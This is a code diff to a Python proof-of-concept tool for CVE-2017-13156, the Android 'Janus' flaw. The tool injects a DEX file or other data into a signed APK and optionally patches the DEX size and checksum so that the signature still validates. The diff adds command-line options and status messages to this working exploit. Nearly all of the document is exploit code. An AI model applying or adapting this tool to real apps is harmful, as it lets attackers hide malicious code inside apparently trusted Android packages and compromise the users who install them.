@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-# Original from https://github.com/V-E-O/PoC/tree/8c389899e6c4e16b2ddab9ba6d77c2696577366f/CVE-2017-13156
-# Updated to Python 3+
+# Based on https://github.com/V-E-O/PoC/tree/8c389899e6c4e16b2ddab9ba6d77c2696577366f/CVE-2017-13156
 
+import argparse
 import sys
 import struct
 import hashlib
@@ -19,13 +19,19 @@ def update_checksum(data):
 
 
 def main():
-    if len(sys.argv) != 4:
-        print('Usage: {} <input_dex> <input_apk> <output_apk>'.format(__file__))
-        return
+    parser = argparse.ArgumentParser(description='Inject custom code or custom data to an APK.')
+    parser.add_argument('-c', '--fix-checksum', action='store_true')
+    parser.add_argument('custom_data', help='This can be a DEX file or custom data, like a TXT file.')
+    parser.add_argument('input_apk', help='The APK you want to inject the custom_data into.')
+    parser.add_argument('output_apk', help='The output APK filename.')
+    args = parser.parse_args()
 
-    _, dex, apk, out_apk = sys.argv
+    dex = args.custom_data
+    apk = args.input_apk
+    out_apk = args.output_apk
 
     with open(dex, 'rb') as f:
+        print('Reading data {}...'.format(dex))
         dex_data = bytearray(f.read())
     dex_size = len(dex_data)
 
@@ -44,10 +50,14 @@ def main():
             break
 
     out_data = dex_data + apk_data
-    out_data[32:36] = struct.pack('<L', len(out_data))
-    update_checksum(out_data)
+
+    if args.fix_checksum:
+        print('Fixing DEX checksum...')
+        out_data[32:36] = struct.pack('<L', len(out_data))
+        update_checksum(out_data)
 
     with open(out_apk, 'wb') as f:
+        print('Saving injected APK to {}...'.format(out_apk))
         f.write(out_data)
 
     print('Successfully generated {}.'.format(out_apk))
